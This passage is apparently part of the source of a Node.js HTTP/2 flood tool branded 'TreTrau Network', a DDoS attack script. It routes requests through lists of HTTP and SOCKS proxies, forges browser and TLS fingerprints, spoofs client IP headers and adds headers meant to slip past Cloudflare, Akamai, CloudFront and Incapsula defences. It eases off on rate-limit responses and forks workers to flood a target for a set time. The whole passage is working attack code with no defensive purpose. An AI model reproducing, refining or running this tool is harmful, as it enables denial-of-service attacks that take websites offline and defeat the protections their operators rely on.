            'x-forwarded-scheme': 'https',
            'x-forwarded-host': hostname,
            'x-request-id': crypto.randomUUID()
        });
    }

    if (options.fingerprintopt) {
        Object.assign(baseHeaders, {
            'x-tls-fingerprint': fixJA3Fingerprint(),
            'x-canvas-fingerprint': fingerprint.canvas,
            'x-webgl-fingerprint': fingerprint.webgl,
            'x-audio-fingerprint': fingerprint.audio,
            'x-timezone': fingerprint.timezone,
            'x-viewport': fingerprint.viewport
        });
    }

    if (Math.random() > 0.3) {
        const referers = [
            'https://www.google.com/',
            'https://www.facebook.com/',
            'https://www.youtube.com/',
            `https://${hostname}/`
        ];
        baseHeaders.referer = randomElement(referers);
    }

    if (baseHeaders[':method'] === 'POST') {
        const postData = random_string(randomInt(10, 50));
        Object.assign(baseHeaders, {
            'content-length': Buffer.from(postData, 'utf-8').length,
            'content-type': 'application/x-www-form-urlencoded'
        });
    }

    return baseHeaders;
}

function generateAdvancedHeaders(proxy, hostname, fingerprint, sessionId, baseHeaders) {
    let headers = { ...baseHeaders };

    if (options.backend) {
        const entropy = crypto.randomBytes(16).toString('hex');
        const timestamp = Date.now();
        
        // Private Method 1: HTTP/2 Stream Prioritization
        headers['x-h2-priority'] = `u=${Math.floor(Math.random() * 8)},i`;
        headers['x-h2-stream-latency'] = Math.floor(Math.random() * 20 + 5).toString();
        
        // Private Method 2: Session Continuity Simulation
        headers['x-session-continuity'] = `${entropy.substring(0, 10)}-${timestamp % 10000}`;
        headers['x-session-flow-id'] = Math.floor(Math.random() * 1000000).toString();
        
        // Private Method 3: TLS Handshake Entropy
        headers['x-tls-handshake-id'] = crypto.randomBytes(24).toString('hex');
        
        // Private Method 4: Protocol Behavior Mimicry
        headers['x-protocol-behavior'] = Buffer.from(`${sessionId}:${timestamp}`).toString('base64').substring(0, 20);
        
        // Private Method 5: Simulated Browser Environment Metrics
        headers['x-browser-metrics'] = JSON.stringify({
            cpuCores: [4, 8, 12][Math.floor(Math.random() * 3)],
            memoryAvailable: Math.floor(Math.random() * 60000000 + 20000000),
            domLoadTime: Math.floor(Math.random() * 300 + 100)
        });

        // Target-specific bypass logic
        const targetAnalysis = {
            isCloudflare: hostname.includes('cloudflare') || Math.random() > 0.6,
            isAkamai: hostname.includes('akamai') || Math.random() > 0.7,
            isCloudFront: hostname.includes('cloudfront') || Math.random() > 0.8,
            isIncapsula: hostname.includes('incapsula') || Math.random() > 0.85
        };

        if (targetAnalysis.isCloudflare) {
            headers['x-cf-session-token'] = `${entropy.substring(0, 6)}-${timestamp.toString(16)}`;
            headers['x-cf-edge-delay'] = Math.floor(Math.random() * 15 + 3).toString();
            headers['x-cf-network-asn'] = `AS${Math.floor(Math.random() * 60000 + 1000)}`;
            headers['x-cf-client-context'] = JSON.stringify({
                region: 'Hanoi',
                timezone: 'Asia/Ho_Chi_Minh',
                networkType: ['fiber', '5g'][Math.floor(Math.random() * 2)]
            });
        }

        if (targetAnalysis.isAkamai) {
            headers['x-akamai-flow-id'] = entropy.substring(0, 20);
            headers['x-akamai-region-token'] = `reg:${Math.random().toString(36).substring(2, 10)}`;
            headers['x-akamai-bandwidth'] = `${Math.floor(Math.random() * 80 + 30)}Mbps`;
            headers['x-akamai-device-hint'] = JSON.stringify({
                deviceMemory: [8, 16][Math.floor(Math.random() * 2)],
                lowDataMode: Math.random() > 0.9
            });
        }

        if (targetAnalysis.isCloudFront) {
            headers['x-aws-flow-id'] = `flow-${entropy.substring(0, 8)}`;
            headers['x-aws-edge-latency'] = Math.floor(Math.random() * 25 + 8).toString();
            headers['x-aws-client-type'] = ['desktop', 'mobile'][Math.floor(Math.random() * 2)];
        }

        if (targetAnalysis.isIncapsula) {
            headers['x-inc-flow-token'] = entropy.substring(0, 18);
            headers['x-inc-interaction-id'] = `int:${Math.floor(Math.random() * 500)}`;
            headers['x-inc-session-context'] = JSON.stringify({
                navigationCount: Math.floor(Math.random() * 8 + 1),
                pageRenderTime: Math.floor(Math.random() * 800 + 150)
            });
        }

        headers['x-forwarded-for'] = `${randomInt(1, 223)}.${randomInt(1, 255)}.${randomInt(1, 255)}.${randomInt(1, 254)}`;
        headers['x-real-ip'] = `${randomInt(1, 223)}.${randomInt(1, 255)}.${randomInt(1, 255)}.${randomInt(1, 254)}`;
    }

    return headers;
}
function createAdvancedTLSSocket(socket, hostname) {
    return tls.connect({
        socket,
        ALPNProtocols: ['h2'],
        ciphers: randomElement(cplist),
        sigalgs: sigalgs,
        ecdhCurve: randomElement(ecdhCurve),
        secureContext: secureContext,
        honorCipherOrder: true,
        rejectUnauthorized: false,
        servername: hostname,
        maxVersion: 'TLSv1.3',
        minVersion: 'TLSv1.2',
        requestOCSP: true
    });
}

async function flood(endTime, retryCount = 0) {
    if (retryCount > 3) return;

    let proxy, proxyhost, proxyport, proxyuser, proxypass, proxyStr;
    try {
        proxy = randomElement(proxies);
        if (!proxy) return;
        proxy = proxy.split(':');
        if (!proxy[0] || !proxy[1]) return;
        proxyhost = proxy[0];
        proxyport = parseInt(proxy[1]);
        proxyuser = proxy.length > 2 ? proxy[2] : null;
        proxypass = proxy.length > 3 ? proxy[3] : null;
        proxyStr = `${proxyhost}:${proxyport}`;
    } catch {
        setTimeout(() => flood(endTime, retryCount + 1), 500);
        return;
    }

    const hostname = new URL(host).hostname;
    const fingerprint = fingerprintGen.getRandomFingerprint();
    const sessionId = randomHex(16);

    let socket;
    const connectOptions = {
        host: hostname,
        port: 443,
        timeout: 5000
    };

    const createConnection = (callback) => {
        try {
            if (options.proxytype.toLowerCase() === 'http') {
                socket = net.connect({ host: proxyhost, port: proxyport }, () => {
                    const connectReq = 
                        `CONNECT ${hostname}:443 HTTP/1.1\r\n` +
                        `Host: ${hostname}:443\r\n` +
                        `User-Agent: ${fingerprint.ua}\r\n` +
                        `Proxy-Connection: Keep-Alive\r\n` +
                        (proxyuser && proxypass ? `Proxy-Authorization: Basic ${Buffer.from(`${proxyuser}:${proxypass}`).toString('base64')}\r\n` : '') +
                        `\r\n`;
                    socket.write(connectReq);
                });
                
                let response = '';
                socket.on('data', (chunk) => {
                    response += chunk.toString();
                    if (response.includes('\r\n\r\n')) {
                        const statusLine = response.split('\r\n')[0];
                        const statusCode = statusLine.match(/HTTP\/\d\.\d\s+(\d+)/)?.[1];
                        if (statusCode === '200') {
                            callback(null, socket);
                        } else {
                            callback(new Error());
                        }
                        socket.removeAllListeners('data');
                    }
                });
            } else {
                socks.createConnection({
                    proxy: {
                        host: proxyhost,
                        port: proxyport,
                        type: options.proxytype.toLowerCase() === 'socks5' ? 5 : 4,
                        ...(proxyuser && proxypass && { userId: proxyuser, password: proxypass })
                    },
                    command: 'connect',
                    destination: connectOptions,
                    timeout: 5000
                }, (err, info) => {
                    if (err) return callback(err);
                    callback(null, info.socket);
                });
            }
        } catch {
            callback(new Error());
        }
    };

    createConnection((err, socket) => {
        if (err) {
            setTimeout(() => flood(endTime, retryCount + 1), 500);
            return;
        }

        let isCleaningUp = false;
        socket.setTimeout(5000);

        const tlsSocket = createAdvancedTLSSocket(socket, hostname);
        if (!tlsSocket) {
            setTimeout(() => flood(endTime, retryCount + 1), 500);
            return;
        }
        
        const cleanup = () => {
            if (isCleaningUp) return;
            isCleaningUp = true;
            try {
                if (client) client.close();
                if (tlsSocket) tlsSocket.destroy();
                if (socket) socket.destroy();
                connectionPool.delete(proxyStr);
            } catch {}
        };

        let client;

        tlsSocket.on('secureConnect', async () => {
            if (tlsSocket.alpnProtocol !== 'h2') {
                cleanup();
                return;
            }

            const isps = [
                'Cloudflare, Inc.', 'FDCservers.net', 'OVH SAS', 'VNXCLOUD',
                'Akamai Technologies, Inc.', 'Fastly, Inc.', 'Ddos-guard LTD',
                'Amazon.com, Inc.', 'Microsoft Corporation', 'Google LLC'
            ];
            const isp = randomElement(isps);
            let settings = getOptimizedHttp2SettingsByISP(isp);

            if (options.backend) {
                const targetAnalysis = {
                    isCloudflare: hostname.includes('cloudflare') || Math.random() > 0.6,
                    isAkamai: hostname.includes('akamai') || Math.random() > 0.7
                };
                if (targetAnalysis.isCloudflare) {
                    settings.headerTableSize = 8192 + Math.floor(Math.random() * 2048);
                    settings.maxConcurrentStreams = Math.floor(Math.random() * 500 + 500);
                } else if (targetAnalysis.isAkamai) {
                    settings.initialWindowSize = 131072 + Math.floor(Math.random() * 65536);
                    settings.maxFrameSize = 32768;
                }
            }

            try {
                client = http2.connect(host, {
                    createConnection: () => tlsSocket,
                    settings
                });
            } catch {
                cleanup();
                return;
            }

            connectionPool.set(proxyStr, { client, tlsSocket, socket, lastUsed: Date.now() });

            let statusCounts = {};
            let totalRequests = 0;
            let currentRate = parseInt(rate);
            let lastLogTime = Date.now();
            let lastResetTime = Date.now();
            let consecutiveErrors = 0;
            let sessionStart = Date.now();
            let currentUrl = host;

            const sendRequest = async () => {
                if (Date.now() >= endTime || client.destroyed || consecutiveErrors > 5 || Date.now() - sessionStart >= 5000) {
                    cleanup();
                    if (Date.now() < endTime) {
                        setTimeout(() => flood(endTime, retryCount + 1), 500);
                    }
                    return;
                }

                try {
                    let baseHeaders = generateBaseHeaders(proxyStr, hostname, fingerprint, sessionId);
                    let headers = generateAdvancedHeaders(proxyStr, hostname, fingerprint, sessionId, baseHeaders);
                    if (!Object.keys(headers).length) throw new Error();
                    hpack.compressHeaders(headers);
                    const req = client.request(headers, {
                        endStream: headers[':method'] === 'GET'
                    });

                    let responseBody = '';
                    let responseHeaders = {};

                    req.on('response', async (headers) => {
                        responseHeaders = headers;
                        const status = headers[':status'];
                        statusCounts[status] = (statusCounts[status] || 0) + 1;
                        totalRequests++;
                        consecutiveErrors = 0;

                        if (options.redirect && [301, 302, 307].includes(status)) {
                            try {
                                const redirectResult = await redirectHandler.handleRedirect(
                                    { ...headers, body: responseBody },
                                    currentUrl,
                                    { customHeaders: headers }
                                );
                                if (redirectResult && redirectResult.redirectUrl) {
                                    currentUrl = redirectResult.redirectUrl;
                                    let redirectBaseHeaders = { ...headers, ...redirectResult.redirectOptions.customHeaders };
                                    headers = generateAdvancedHeaders(proxyStr, new URL(currentUrl).hostname, fingerprint, sessionId, redirectBaseHeaders);
                                    const newReq = client.request(headers, {
                                        endStream: headers[':method'] === 'GET'
                                    });
                                    newReq.on('response', (newHeaders) => {
                                        responseHeaders = newHeaders;
                                        statusCounts[newHeaders[':status']] = (statusCounts[newHeaders[':status']] || 0) + 1;
                                        totalRequests++;
                                    });
                                    newReq.on('data', (chunk) => {
                                        responseBody += chunk.toString();
                                    });
                                    newReq.on('end', () => {});
                                    newReq.on('error', () => {
                                        consecutiveErrors++;
                                        if (consecutiveErrors > 5) {
                                            cleanup();
                                            setTimeout(() => flood(endTime, retryCount + 1), 500);
                                        }
                                    });
                                    if (headers[':method'] === 'POST') {
                                        const postData = random_string(randomInt(10, 50));
                                        newReq.write(postData);
                                        newReq.end();
                                    }
                                }
                            } catch {
                                consecutiveErrors++;
                            }
                        }

                        if (Date.now() - lastLogTime >= 3000) {
                            const statusText = Object.entries(statusCounts).map(([k, v]) => `${k}: ${v}`).join(', ');
                            const label = '\x1b[38;2;7;140;255mT\x1b[38;2;21;130;255mr\x1b[38;2;35;121;255me\x1b[38;2;49;112;255mT\x1b[38;2;63;102;255mr\x1b[38;2;77;93;255ma\x1b[38;2;91;84;255mu\x1b[38;2;105;74;255m \x1b[38;2;119;65;255mN\x1b[38;2;133;56;255me\x1b[38;2;147;46;255mt\x1b[38;2;161;37;255mw\x1b[38;2;175;28;255mo\x1b[38;2;189;18;255mr\x1b[38;2;203;9;255mk\x1b[38;2;217;0;255m\033[0m';
                            console.log(`[${label}] | Target: [\x1b[4m${host}\x1b[0m] | Requests: ${totalRequests} | Status: [${statusText}]`);
                            lastLogTime = Date.now();
                            if (Date.now() - lastResetTime >= 60000) {
                                statusCounts = {};
                                lastResetTime = Date.now();
                            }
                        }

                        if (options.ratelimitopt && status === 429) {
                            currentRate = Math.max(10, Math.floor(currentRate * 0.8));
                            setTimeout(() => {
                                currentRate = Math.min(parseInt(rate), Math.floor(currentRate * 1.2));
                            }, 5000);
                        }
                    });

                    req.on('data', (chunk) => {
                        responseBody += chunk.toString();
                    });
                    req.on('end', () => {});
                    req.on('error', () => {
                        consecutiveErrors++;
                        if (consecutiveErrors > 5) {
                            cleanup();
                            setTimeout(() => flood(endTime, retryCount + 1), 500);
                        }
                    });

                    if (headers[':method'] === 'POST') {
                        const postData = random_string(randomInt(10, 50));
                        req.write(postData);
                        req.end();
                    }

                    if (!client.destroyed && totalRequests % 10 === 0) {
                        setImmediate(sendRequest);
                    } else {
                        const delay = Math.max(5, 1000 / (currentRate * (options.backend ? 1.5 : 2)));
                        setTimeout(sendRequest, delay);
                    }
                } catch {
                    consecutiveErrors++;
                    if (consecutiveErrors > 5) {
                        cleanup();
                        setTimeout(() => flood(endTime, retryCount + 1), 500);
                    } else {
                        setImmediate(sendRequest);
                    }
                }
            };

            for (let i = 0; i < 10; i++) {
                setTimeout(sendRequest, i * (options.backend ? 15 : 10));
            }
        });

        tlsSocket.on('error', () => {
            if (!isCleaningUp) {
                cleanup();
                setTimeout(() => flood(endTime, retryCount + 1), 500);
            }
        });

        socket.on('timeout', () => {
            if (!isCleaningUp) {
                cleanup();
                setTimeout(() => flood(endTime, retryCount + 1), 500);
            }
        });

        socket.on('error', () => {
            if (!isCleaningUp) {
                cleanup();
                setTimeout(() => flood(endTime, retryCount + 1), 500);
            }
        });
    });
}

function start() {
    const endTime = Date.now() + parseInt(time) * 1000;

    if (options.info) {
        console.log('=== Attack Information ===');
        console.log(`Target: ${host}`);
        console.log(`Duration: ${time} seconds`);
        console.log(`Rate: ${rate} requests/second`);
        console.log(`Threads: ${thread}`);
        console.log(`Proxy File: ${proxyfile} (${proxies.length} proxies)`);
        console.log(`Proxy Type: ${options.proxytype}`);
        console.log('Options Enabled:');
        console.log(`  Random Path: ${options.randpath}`);
        console.log(`  High Bypass: ${options.highbypass}`);
        console.log(`  Cache Bypass: ${options.cachebypass}`);
        console.log(`  Full Headers: ${options.fullheaders}`);
        console.log(`  Extra Headers: ${options.extraheaders}`);
        console.log(`  Query Optimization: ${options.queryopt}`);
        console.log(`  Fingerprint: ${options.fingerprintopt}`);
        console.log(`  Rate Limiting: ${options.ratelimitopt}`);
        console.log(`  Redirect: ${options.redirect}`);
        console.log(`  No Path: ${options.npath}`);
        console.log(`  All Options: ${options.useAll}`);
        console.log('=========================');
    }

    if (cluster.isPrimary) {
        console.log(`Attack Successfully Sent With ${thread} Thread`);
        for (let i = 0; i < parseInt(thread); i++) {
            cluster.fork();
        }

        cluster.on('exit', (worker) => {
            console.log(` Restarting...`);
            cluster.fork();
        });

        setTimeout(() => {
            console.log('Attack completed');
            Object.values(cluster.workers).forEach(worker => worker.kill());
            process.exit(0);
        }, parseInt(time) * 1000);

        setInterval(() => {
            for (const [proxy, conn] of connectionPool.entries()) {
                if (Date.now() - conn.lastUsed > 10000) {
                    conn.client.close();
                    conn.tlsSocket.destroy();
                    conn.socket.destroy();
                    connectionPool.delete(proxy);
                }
            }
        }, 5000);
    } else {
        function runWorker() {
            if (Date.now() >= endTime) {
                return process.exit(0);
            }
            if (connectionPool.size < MAX_CONNECTIONS_PER_WORKER) {
                flood(endTime);
            }
            setImmediate(runWorker);
        }
        runWorker();
    }
}

start();